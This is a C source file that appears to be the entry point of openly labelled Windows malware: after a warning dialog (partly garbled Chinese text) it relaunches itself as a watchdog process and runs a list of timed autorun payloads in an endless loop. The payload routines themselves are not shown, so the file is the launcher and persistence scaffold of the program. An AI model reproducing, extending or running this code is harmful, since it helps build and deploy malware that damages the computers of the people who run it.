#include "payloads.h"
#include "watchdog.h"

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char * lpCmdLine, int nCmdShow)
{
	if (strcmp(lpCmdLine, RUN_AS_WATCHDOG_IDENTIFICATION) == 0)
	{
		CreateThread(NULL, NULL, WatchDog_Thread, NULL, NULL, NULL);
	}
	else
	{
		if (MessageBox(NULL, "You just ran a malware.  This software is not for ikun use, if you are ikun please do not test.\nIf you are not ikun and have placed it in the prepared test environment, please click 'Yes' to start the test.\n\n��ո����е���һ��������������������ikunʹ�ã��������ikun�벻Ҫ���ԡ�\n����㲻��ikun�������Ѿ�����������׼���õĲ��Ի����У����'��'��ʼ���ԡ�", "������", MB_ICONWARNING | MB_YESNO) != IDYES)
			return -1;

		char CurrentFilename[MAX_PATH];
		GetModuleFileName(NULL, CurrentFilename, MAX_PATH);
		ShellExecute(NULL, NULL, CurrentFilename, RUN_AS_WATCHDOG_IDENTIFICATION, NULL, NULL);

		for (int i = 0; i < autorun_payloads_count; i++)
		{
			Sleep(autorun_payloads[i].startup_delay);
			RunPayload(autorun_payloads[i].entrance, NULL);
		}
	}

	for(;;)
		Sleep(50000);

	return 0;
}
